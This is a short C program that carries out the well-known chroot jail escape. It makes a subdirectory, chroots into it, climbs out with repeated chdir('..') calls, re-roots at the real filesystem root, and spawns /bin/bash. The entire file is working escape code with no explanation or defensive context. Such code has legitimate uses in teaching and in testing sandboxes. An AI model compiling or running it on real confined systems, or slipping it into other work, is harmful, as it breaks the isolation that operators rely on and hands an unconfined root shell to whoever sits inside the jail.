#include <sys/stat.h>
#include <unistd.h>

int main(void) {
	mkdir("jail", 0755);
	chroot("jail");
	for (int i = 0; i < 64; i++) {
		chdir("..");
	}
	chroot(".");
	execl("/bin/bash", "bash", NULL);
	return 1;
}
